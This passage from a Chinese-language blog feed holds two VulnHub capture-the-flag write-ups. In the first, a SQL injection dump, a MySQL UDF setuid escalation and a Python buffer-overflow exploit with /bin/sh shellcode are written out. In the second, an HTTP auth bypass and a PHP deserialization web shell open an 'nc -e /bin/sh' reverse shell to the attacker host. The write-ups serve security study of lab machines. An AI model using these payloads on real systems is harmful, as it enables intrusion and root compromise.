&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;/images/hipster.jpg&quot;</span> <span class="nv">align</span><span class="o">=</span><span class="s2">&quot;middle&quot;</span>&gt;
&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;
&lt;/html&gt;</code></pre></div>


<p>用base64解碼之後得到了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">Lzk3ODM0NTIxMC9pbmRleC5waHA</span><span class="o">=</span> Closer!</code></pre></div>


<p>再解一次之後得到</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">/978345210/index.php</code></pre></div>


<p>於是我們來到了魔鐸之門 (?</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-26-lord_of_the_root/gom.png"></p>

<p>看到這麼陽春的登入畫面，推測應該是用SQL injection打無誤(?</p>

<p>簡單試過一些基本的SQLi語句卻都沒有效果</p>

<p>只好求助sqlmap大神</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root# sqlmap --url<span class="o">=</span><span class="s1">&#39;http://192.168.0.121:1337/978345210/index.php&#39;</span> --data<span class="o">=</span><span class="s2">&quot;username=asd&amp;password=asd&amp;submit= Login&quot;</span> --dump-all --level 5
...
<span class="o">[</span>11:40:29<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt; 5.0.11 AND time-based blind&#39;</span>
<span class="o">[</span>11:41:19<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> POST parameter <span class="s1">&#39;username&#39;</span> seems to be <span class="s1">&#39;MySQL &gt; 5.0.11 AND time-based blind&#39;</span> injectable
...
<span class="o">[</span>11:41:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> checking <span class="k">if</span> the injection point on POST parameter <span class="s1">&#39;username&#39;</span> is a <span class="nb">false </span>positive
POST parameter <span class="s1">&#39;username&#39;</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">[</span>y/N<span class="o">]</span>
sqlmap identified the following injection points with a total of <span class="m">2094</span> HTTP<span class="o">(</span>s<span class="o">)</span> requests:
---
Place: POST
Parameter: username
    Type: AND/OR <span class="nb">time</span>-based blind
    Title: MySQL &gt; 5.0.11 AND <span class="nb">time</span>-based blind
    Payload: <span class="nv">username</span><span class="o">=</span>asd<span class="s1">&#39;||(SELECT &#39;</span>NAyM<span class="s1">&#39; FROM DUAL WHERE 8495=8495 AND SLEEP(5) )||&#39;</span><span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>asd<span class="p">&amp;</span><span class="nv">submit</span><span class="o">=</span> Login
---
<span class="o">[</span>11:46:08<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.11</code></pre></div>




<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>12:09:03<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> starting dictionary-based cracking <span class="o">(</span>mysql_passwd<span class="o">)</span>
<span class="o">[</span>12:09:13<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> cracked password <span class="s1">&#39;darkshadow&#39;</span> <span class="k">for</span> user <span class="s1">&#39;root&#39;</span>
database management system users password hashes:
<span class="o">[</span>*<span class="o">]</span> debian-sys-maint <span class="o">[</span>1<span class="o">]</span>:
    password <span class="nb">hash</span>: *A55A9B9049F69BC2768C9284615361DFBD580B34
<span class="o">[</span>*<span class="o">]</span> root <span class="o">[</span>1<span class="o">]</span>:
    password <span class="nb">hash</span>: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
    clear-text password: darkshadow</code></pre></div>




<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>09:50:20<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching columns <span class="k">for</span> table <span class="s1">&#39;Users&#39;</span> in database <span class="s1">&#39;Webapp&#39;</span>
...
+----+----------+------------------+
<span class="p">|</span> id <span class="p">|</span> username <span class="p">|</span> password         <span class="p">|</span>
+----+----------+------------------+
<span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> frodo    <span class="p">|</span> iwilltakethering <span class="p">|</span>
<span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> smeagol  <span class="p">|</span> MyPreciousR00t   <span class="p">|</span>
<span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> aragorn  <span class="p">|</span> AndMySword       <span class="p">|</span>
<span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> legolas  <span class="p">|</span> AndMyBow         <span class="p">|</span>
<span class="p">|</span> <span class="m">5</span>  <span class="p">|</span> gimli    <span class="p">|</span> AndMyAxe         <span class="p">|</span>
+----+----------+------------------+</code></pre></div>


<p>成功把資料庫dump出來</p>

<p>裡面有一張表看起來有點用處的帳號+密碼組合</p>

<p>還得到了mysql內root的密碼為darkshadow</p>

<p>拿這些帳號密碼去嘗試登入ssh，最後成功使用smeagol登入</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">Welcome to Ubuntu 14.04.3 LTS <span class="o">(</span>GNU/Linux 3.19.0-25-generic i686<span class="o">)</span>

 * Documentation:  https://help.ubuntu.com/

<span class="m">261</span> packages can be updated.
<span class="m">128</span> updates are security updates.

                            .____    _____________________________
                            <span class="p">|</span>    <span class="p">|</span>   <span class="se">\_</span>____  <span class="se">\_</span>_    ___/<span class="se">\_</span>_____   <span class="se">\</span>
                            <span class="p">|</span>    <span class="p">|</span>    /   <span class="p">|</span>   <span class="se">\|</span>    <span class="p">|</span>    <span class="p">|</span>       _/
                            <span class="p">|</span>    <span class="p">|</span>___/    <span class="p">|</span>    <span class="se">\ </span>   <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>   <span class="se">\</span>
                            <span class="p">|</span>_______ <span class="se">\_</span>______  /____<span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span>_  /
                                    <span class="se">\/</span>       <span class="se">\/</span>                 <span class="se">\/</span>
 __      __       .__                                ___________      .__                   .___
/  <span class="se">\ </span>   /  <span class="se">\ </span>____ <span class="p">|</span>  <span class="p">|</span>   ____  ____   _____   ____   <span class="se">\_</span>   _____/______<span class="p">|</span>__<span class="p">|</span> ____   ____    __<span class="p">|</span> _/
<span class="se">\ </span>  <span class="se">\/\/</span>   // __ <span class="se">\|</span>  <span class="p">|</span> _/ ___<span class="se">\/</span>  _ <span class="se">\ </span>/     <span class="se">\_</span>/ __ <span class="se">\ </span>  <span class="p">|</span>    __<span class="o">)</span> <span class="se">\_</span>  __ <span class="se">\ </span> <span class="p">|</span>/ __ <span class="se">\ </span>/    <span class="se">\ </span> / __ <span class="p">|</span>
 <span class="se">\ </span>       /<span class="se">\ </span> ___/<span class="p">|</span>  <span class="p">|</span>_<span class="se">\ </span> <span class="se">\_</span>_<span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  Y Y  <span class="se">\ </span> ___/   <span class="p">|</span>     <span class="se">\ </span>  <span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>  <span class="se">\ </span> ___/<span class="p">|</span>   <span class="p">|</span>  <span class="se">\/</span> /_/ <span class="p">|</span>
  <span class="se">\_</span>_/<span class="se">\ </span> /  <span class="se">\_</span>__  &gt;____/<span class="se">\_</span>__  &gt;____/<span class="p">|</span>__<span class="p">|</span>_<span class="p">|</span>  /<span class="se">\_</span>__  &gt;  <span class="se">\_</span>__  /   <span class="p">|</span>__<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span><span class="se">\_</span>__  &gt;___<span class="p">|</span>  /<span class="se">\_</span>___ <span class="p">|</span>
       <span class="se">\/</span>       <span class="se">\/</span>          <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>       <span class="se">\/</span>                  <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>
Last login: Tue Sep <span class="m">22</span> 12:59:38 <span class="m">2015</span> from 192.168.55.135
smeagol@LordOfTheRoot:~<span class="err">$</span></code></pre></div>


<p>再來登入mysql，試試看之前看過的<a href="http://www.0xdeadbeef.info/exploits/raptor_udf2.c">MySQL UDF Exploit</a>有沒有效果</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> do_system<span class="o">(</span><span class="s1">&#39;cp /bin/sh /home/smeagol/bash&#39;</span><span class="o">)</span><span class="p">;</span>
+------------------------------------------+
<span class="p">|</span> do_system<span class="o">(</span><span class="s1">&#39;cp /bin/sh /home/smeagol/bash&#39;</span><span class="o">)</span> <span class="p">|</span>
+------------------------------------------+
<span class="p">|</span>                                        <span class="m">0</span> <span class="p">|</span>
+------------------------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>

mysql&gt; <span class="k">select</span> do_system<span class="o">(</span><span class="s1">&#39;chmod 4777 /home/smeagol/bash&#39;</span><span class="o">)</span><span class="p">;</span>
+------------------------------------------+
<span class="p">|</span> do_system<span class="o">(</span><span class="s1">&#39;chmod 4777 /home/smeagol/bash&#39;</span><span class="o">)</span> <span class="p">|</span>
+------------------------------------------+
<span class="p">|</span>                                        <span class="m">0</span> <span class="p">|</span>
+------------------------------------------+</code></pre></div>


<p>接著來看看成果</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">smeagol@LordOfTheRoot:~<span class="nv">$ </span>ls -al
...
-rwsrwxrwx  <span class="m">1</span> root    root    <span class="m">112204</span> Dec <span class="m">26</span> 16:43 bash
...
smeagol@LordOfTheRoot:~<span class="nv">$ </span>./sh
bash-4.3<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>smeagol<span class="o">)</span>
bash-4.3<span class="nv">$ </span>cat /root/Flag.txt
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf</code></pre></div>


<p>成功拿下魔戒的root！不過總覺得用這個方法拿到root有點太過輕鬆</p>

<p>於是簡單地檢查了一下，最後找到了三支奇怪的程式</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="k">for</span> i in <span class="k">$(</span>find / -perm -4000 2&gt;/dev/null<span class="k">)</span><span class="p">;</span> <span class="k">do</span> ls -al <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
...
-rwsr-xr-x <span class="m">1</span> root root <span class="m">5150</span> Sep <span class="m">22</span> 13:01 /SECRET/door2/file
-rwsr-xr-x <span class="m">1</span> root root <span class="m">7370</span> Sep <span class="m">17</span> 23:08 /SECRET/door1/file
-rwsr-xr-x <span class="m">1</span> root root <span class="m">7370</span> Sep <span class="m">17</span> 23:08 /SECRET/door3/file</code></pre></div>


<p>而且這命名看起來才飽含了作者對魔戒的愛，從這邊拿下root應該才是作者所希望的解法。</p>

<p>這三個file檔分別放在door1, door2, door3三個目錄下</p>

<p>其中兩支看起來似乎是同一支程式，而且執行之後沒做甚麼事情就結束了</p>

<p>剩下的一支可以傳入參數達到Buffer Overflow的效果</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root/door3# objdump -D file <span class="p">|</span> grep -A30 main.:
0804845d &lt;main&gt;:
 804845d:       <span class="m">55</span>                      push   %ebp
 804845e:       <span class="m">89</span> e5                   mov    %esp,%ebp
 8048460:       <span class="m">83</span> e4 f0                and    <span class="nv">$0xfffffff0</span>,%esp
 8048463:       <span class="m">81</span> ec b0 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>       sub    <span class="nv">$0xb0</span>,%esp
 8048469:       <span class="m">83</span> 7d <span class="m">08</span> <span class="m">01</span>             cmpl   <span class="nv">$0x1</span>,0x8<span class="o">(</span>%ebp<span class="o">)</span>
 804846d:       7f <span class="m">21</span>                   jg     <span class="m">8048490</span> &lt;main+0x33&gt;
 804846f:       8b <span class="m">45</span> 0c                mov    0xc<span class="o">(</span>%ebp<span class="o">)</span>,%eax
 8048472:       8b <span class="m">00</span>                   mov    <span class="o">(</span>%eax<span class="o">)</span>,%eax
 8048474:       <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    %eax,0x4<span class="o">(</span>%esp<span class="o">)</span>
 8048478:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">40</span> <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>    movl   <span class="nv">$0x8048540</span>,<span class="o">(</span>%esp<span class="o">)</span>
 804847f:       e8 8c fe ff ff          call   <span class="m">8048310</span> &lt;<span class="nb">printf</span>@plt&gt;
 8048484:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>    movl   <span class="nv">$0x0</span>,<span class="o">(</span>%esp<span class="o">)</span>
 804848b:       e8 b0 fe ff ff          call   <span class="m">8048340</span> &lt;<span class="nb">exit</span>@plt&gt;
 8048490:       8b <span class="m">45</span> 0c                mov    0xc<span class="o">(</span>%ebp<span class="o">)</span>,%eax
 8048493:       <span class="m">83</span> c0 <span class="m">04</span>                add    <span class="nv">$0x4</span>,%eax
 8048496:       8b <span class="m">00</span>                   mov    <span class="o">(</span>%eax<span class="o">)</span>,%eax
 8048498:       <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    %eax,0x4<span class="o">(</span>%esp<span class="o">)</span>
 804849c:       8d <span class="m">44</span> <span class="m">24</span> <span class="m">11</span>             lea    0x11<span class="o">(</span>%esp<span class="o">)</span>,%eax
 80484a0:       <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
 80484a3:       e8 <span class="m">78</span> fe ff ff          call   <span class="m">8048320</span> &lt;strcpy@plt&gt;
 80484a8:       b8 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x0</span>,%eax
 80484ad:       c9                      leave
 80484ae:       c3                      ret</code></pre></div>


<p>接著用pattern_create.rb和pattern_offset.rb找出EIP的注入點</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root/door3# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41376641
<span class="o">[</span>*<span class="o">]</span> Exact match at offset 171</code></pre></div>


<p>再來先檢查目標端的ASLR有沒有開啟</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">smeagol@LordOfTheRoot:/SECRET/door3<span class="nv">$ </span>cat /proc/sys/kernel/randomize_va_space
2</code></pre></div>


<p>ASLR是開著的，看來要靠nop-sled拼人品了</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="n">nopsled</span> <span class="o">=</span> <span class="mi">20000</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">171</span>               <span class="c"># trash</span>
<span class="n">payload</span><span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x50\x2e\xb0\xbf</span><span class="s">&quot;</span>    <span class="c"># EIP</span>
<span class="n">payload</span><span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="n">nopsled</span>        <span class="c"># nop sled</span>
<span class="n">payload</span><span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s">&quot;</span>      <span class="c">#shellcode</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
                <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;/SECRET/door</span><span class="si">%d</span><span class="s">/file </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
                <span class="n">os</span><span class="o">.</span><span class="n">system</span> <span class="p">(</span><span class="n">cmd</span><span class="p">)</span></code></pre></div>


<p>拿了一份會執行/bin/sh的
<a href="http://shell-storm.org/shellcode/files/shellcode-811.php">shellcode</a>，把payload拼完之後就是賭人品的時刻了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>smeagol<span class="o">)</span></code></pre></div>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[/dev/random: Pipe]]></title>
    <link href="http://newdominic.github.io/blog/2015/12/23/pipe/"/>
    <updated>2015-12-23T00:38:42+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/12/23/pipe</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/devrandom-pipe,124/">/dev/random: Pipe</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/pipe# nmap 192.168.0.118 -p- -T5 -n

Starting Nmap 6.49BETA4 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2015-12-21 04:55 CST
Warning: 192.168.0.118 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span>.
Nmap scan report <span class="k">for</span> 192.168.0.118
Host is up <span class="o">(</span>0.00019s latency<span class="o">)</span>.
Not shown: <span class="m">65531</span> closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
35856/tcp open  unknown
MAC Address: 08:00:27:D7:0B:8C <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 513.72 seconds</code></pre></div>


<p>nmap掃出了四個開啟的port，先來看一下port 80</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-23-pipe/web.png"></p>

<p>&hellip;&hellip;第一次遇到首頁就要輸入帳號密碼的</p>

<p>35856不知道做甚麼用的，再深入掃瞄試試</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/pipe# nmap 192.168.0.118 -p 22,80,111,35856 -A -O
...
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey:
<span class="p">|</span>   <span class="m">1024</span> 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f <span class="o">(</span>DSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">2048</span> ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 <span class="o">(</span>ECDSA<span class="o">)</span>
80/tcp    open  http    Apache httpd
<span class="p">|</span> http-auth:
<span class="p">|</span> HTTP/1.1 <span class="m">401</span> Unauthorized
<span class="p">|</span>_  Basic <span class="nv">realm</span><span class="o">=</span>index.php
<span class="p">|</span>_http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 401<span class="o">)</span>
<span class="p">|</span>_http-server-header: Apache
<span class="p">|</span>_http-title: <span class="m">401</span> Unauthorized
111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
<span class="p">|</span> rpcinfo:
<span class="p">|</span>   program version   port/proto  service
<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
<span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35856/tcp  status
<span class="p">|</span>_  <span class="m">100024</span>  <span class="m">1</span>          44438/udp  status
35856/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span></code></pre></div>


<p>結果是rpc對應的port。</p>

<p>在不知道能做甚麼的情況下，只好回到網頁的部分亂試一通</p>

<p>最後試到只要在request method的部分不要用GET就能繞過認證了</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-23-pipe/index.png"></p>

<p>接著檢視一下程式碼</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;scriptz/php.js&quot;</span>&gt;&lt;/script&gt;
&lt;script&gt;
<span class="k">function</span> submit_form<span class="o">()</span> <span class="o">{</span>
var <span class="nv">object</span> <span class="o">=</span> serialize<span class="o">({</span>id: 1, firstname: <span class="s1">&#39;Rene&#39;</span>, surname: <span class="s1">&#39;Margitte&#39;</span>, artwork: <span class="s1">&#39;The Treachery of Images&#39;</span><span class="o">})</span><span class="p">;</span>
<span class="nv">object</span> <span class="o">=</span> object.substr<span class="o">(</span>object.indexOf<span class="o">(</span><span class="s2">&quot;{&quot;</span><span class="o">)</span>,object.length<span class="o">)</span><span class="p">;</span>
<span class="nv">object</span> <span class="o">=</span> <span class="s2">&quot;O:4:\&quot;Info\&quot;:4:&quot;</span> + object<span class="p">;</span>
document.forms<span class="o">[</span>0<span class="o">]</span>.param.value <span class="o">=</span> object<span class="p">;</span>
document.getElementById<span class="o">(</span><span class="s1">&#39;info_form&#39;</span><span class="o">)</span>.submit<span class="o">()</span><span class="p">;</span>
<span class="o">}</span>
...
&lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">&quot;index.php&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;info_form&quot;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span>&gt;
   &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;param&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> /&gt;
   &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;#&quot;</span> <span class="nv">onclick</span><span class="o">=</span><span class="s2">&quot;submit_form(); return false;&quot;</span>&gt;Show Artist Info.&lt;/a&gt;
&lt;/form&gt;&lt;/center&gt;&lt;/html&gt;</code></pre></div>


<p>scriptz目錄是開放的，從裡面獲得另一個檔案&#8221;log.php.BAK&#8221;</p>

<p>這個class會在destruct的時候將data的內容寫入filename</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;?php
class Log
<span class="o">{</span>
    public <span class="nv">$filename</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    public <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>

    public <span class="k">function</span> __construct<span class="o">()</span>
    <span class="o">{</span>
        <span class="nv">$this</span>-&gt;filename <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
        <span class="nv">$this</span>-&gt;data <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="o">}</span>

    public <span class="k">function</span> PrintLog<span class="o">()</span>
    <span class="o">{</span>
        <span class="nv">$pre</span> <span class="o">=</span> <span class="s2">&quot;[LOG]&quot;</span><span class="p">;</span>
        <span class="nv">$now</span> <span class="o">=</span> date<span class="o">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="o">)</span><span class="p">;</span>

        <span class="nv">$str</span> <span class="o">=</span> <span class="s1">&#39;$pre - $now - $this-&gt;data&#39;</span><span class="p">;</span>
        <span class="nb">eval</span><span class="o">(</span><span class="s2">&quot;\$str = \&quot;$str\&quot;;&quot;</span><span class="o">)</span><span class="p">;</span>
        <span class="nb">echo</span> <span class="nv">$str</span><span class="p">;</span>
    <span class="o">}</span>

    public <span class="k">function</span> __destruct<span class="o">()</span>
    <span class="o">{</span>
        file_put_contents<span class="o">(</span><span class="nv">$this</span>-&gt;filename, <span class="nv">$this</span>-&gt;data, FILE_APPEND<span class="o">)</span><span class="p">;</span>
    <span class="o">}</span>
<span class="o">}</span>
?&gt;</code></pre></div>


<p>按下頁面下方的Show Artist Info之後，瀏覽器會POST一些經過serialize處理後的資訊到index.php</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">param</span><span class="o">=</span>O:4:<span class="s2">&quot;Info&quot;</span>:4:<span class="o">{</span>s:2:<span class="s2">&quot;id&quot;</span><span class="p">;</span>i:1<span class="p">;</span>s:9:<span class="s2">&quot;firstname&quot;</span><span class="p">;</span>s:4:<span class="s2">&quot;Rene&quot;</span><span class="p">;</span>s:7:<span class="s2">&quot;surname&quot;</span><span class="p">;</span>s:8:<span class="s2">&quot;Margitte&quot;</span><span class="p">;</span>s:7:<span class="s2">&quot;artwork&quot;</span><span class="p">;</span>s:23:<span class="s2">&quot;The+Treachery+of+Images&quot;</span><span class="p">;</span><span class="o">}</span></code></pre></div>


<p>serialize的做法在php.js</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">//   example 1: serialize<span class="o">([</span><span class="s1">&#39;Kevin&#39;</span>, <span class="s1">&#39;van&#39;</span>, <span class="s1">&#39;Zonneveld&#39;</span><span class="o">])</span><span class="p">;</span>
//   returns 1: <span class="s1">&#39;a:3:{i:0;s:5:&quot;Kevin&quot;;i:1;s:3:&quot;van&quot;;i:2;s:9:&quot;Zonneveld&quot;;}&#39;</span>
//   example 2: serialize<span class="o">({</span>firstName: <span class="s1">&#39;Kevin&#39;</span>, midName: <span class="s1">&#39;van&#39;</span>, surName: <span class="s1">&#39;Zonneveld&#39;</span><span class="o">})</span><span class="p">;</span>
//   returns 2: <span class="s1">&#39;a:3:{s:9:&quot;firstName&quot;;s:5:&quot;Kevin&quot;;s:7:&quot;midName&quot;;s:3:&quot;van&quot;;s:7:&quot;surName&quot;;s:9:&quot;Zonneveld&quot;;}&#39;</span></code></pre></div>


<p>接著將submit_form()的內容改成要送出的資訊</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-23-pipe/html.png"></p>

<p>選擇送到scriptz是因為可以直接進到scriptz的目錄確認有沒有寫入成功</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-23-pipe/yo.png"></p>

<p>而data的內容看起來也是成功寫入yo.php了</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-23-pipe/yo2.png"></p>

<p>再來就試試看能不能送個reverse shell回來</p>

<p>直接修改html的內容</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;script&gt;
<span class="k">function</span> submit_form<span class="o">()</span> <span class="o">{</span>
  var <span class="nv">object</span> <span class="o">=</span> serialize<span class="o">({</span>filename: <span class="s1">&#39;/var/www/html/scriptz/shell.php&#39;</span>, data: <span class="s1">&#39;&lt;?php passthru(&quot;nc -e /bin/sh 192.168.0.115 22234&quot;); ?&gt;&#39;</span><span class="o">})</span><span class="p">;</span>
<span class="nv">object</span> <span class="o">=</span> object.substr<span class="o">(</span>object.indexOf<span class="o">(</span><span class="s2">&quot;{&quot;</span><span class="o">)</span>,object.length<span class="o">)</span><span class="p">;</span>
  <span class="nv">object</span> <span class="o">=</span> <span class="s2">&quot;O:3:\&quot;Log\&quot;:2:&quot;</span> + object<span class="p">;</span>
document.forms<span class="o">[</span>0<span class="o">]</span>.param.value <span class="o">=</span> object<span class="p">;</span>
document.getElementById<span class="o">(</span><span class="s1">&#39;info_form&#39;</span><span class="o">)</span>.submit<span class="o">()</span><span class="p">;</span>
<span class="o">}</span>
&lt;/script&gt;</code></pre></div>


<p>連上 <a href="http://192.168.0.117/scriptz/shell.php">http://192.168.0.117/scriptz/shell.php</a> 之後瀏覽器就卡住了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/pipe# nc -lp 22234
id
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
uname -a
Linux pipe 3.16.0-4-amd64 <span class="c">#1 SMP Debian 3.16.7-ckt11-1 (2015-05-24) x86_64 GNU/Linux</span></code></pre></div>


<p>shell GET!</p>

<p>簡單地蒐集資訊之後，找到一個使用者 rene ，而且他的家目錄沒有擋權限</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">ls -al
total 208
drwxrwxrwx <span class="m">2</span> rene rene   <span class="m">4096</span> Dec <span class="m">23</span> 05:04 .
